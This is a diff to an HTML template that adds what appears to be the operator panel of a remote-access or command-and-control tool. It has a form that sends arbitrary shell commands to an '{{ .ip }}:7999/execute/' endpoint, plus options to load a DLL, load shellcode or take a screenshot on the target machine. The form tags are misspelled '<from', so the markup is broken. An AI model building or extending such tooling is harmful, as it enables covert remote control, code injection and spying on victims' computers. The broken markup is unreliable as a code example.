@@ -26,9 +26,43 @@
             box-shadow: 0 0 10px rgba(0,0,0,0.1);
             width: 400px;
         }
+
+        h1 {
+            text-align: center;
+            color: #333;
+        }
     </style>
 </head>
 <body>
+
+<div class="container">
+    <h1>Send Command</h1>
+
+    <from action="http://{{ .ip }}:7999/execute/", method="get">
+        <textarea id="commandInput" placeholder="whoami" name="cmd"> </textarea>
+        <div class="btn-group">
+            <input type="submit">
+        </div>
+    </from>
+
+    <from action="http://{{ .ip }}:7999/other/", method="get">
+        <div class="btn-group">
+            <input type="radio" name="loadDll">
+            <label>load dll file</label>
+
+            <input type="radio" name="loadShellcode">
+            <label>load shellcode</label>
+
+            <input type="radio" name="screenShot">
+            <label>screenshot</label>
+
+            <input type="submit">
+        </div>
+    </from>
+
+    <div id="result">{{ .result }}</div>
+
+</div>
 
 </body>
 </html>
